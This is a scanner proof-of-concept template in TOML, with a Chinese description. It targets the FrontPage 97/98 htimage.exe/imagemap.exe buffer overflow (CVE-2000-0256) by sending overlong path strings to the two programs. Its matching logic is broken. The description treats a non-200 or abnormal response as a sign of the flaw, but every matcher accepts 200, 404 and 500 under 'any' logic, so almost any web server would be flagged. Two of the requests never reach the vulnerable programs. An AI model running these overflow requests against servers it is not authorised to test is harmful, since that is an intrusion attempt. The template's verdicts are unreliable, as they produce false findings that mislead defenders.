[info]
author = "ave"
description = "验证目标 FrontPage Server Extensions 的 htimage.exe/imagemap.exe 是否对图像映射点坐标参数缺少长度校验。通过发送超长 point 参数触发缓冲区溢出特征，若返回非 200 或异常响应则可判定存在该漏洞。"
id = "POC-AVE-2000-0800"
name = "FrontPage 97/98 Server Image Mapper 缓冲区溢出 PoC"
severity = "high"
tags = ["ave-2000-0800"]
vuln_id = [
    "CVE-2000-0256",
    "AVE-2000-0800",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/_vti_bin/shtml.exe/_vti_rpc"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    404,
    500,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/_vti_bin/fpadmin/_vti_rpc"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    404,
    500,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/htimage.exe/AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMM"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    404,
    500,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/imagemap.exe/AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMM"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    404,
    500,
]
type = "status"
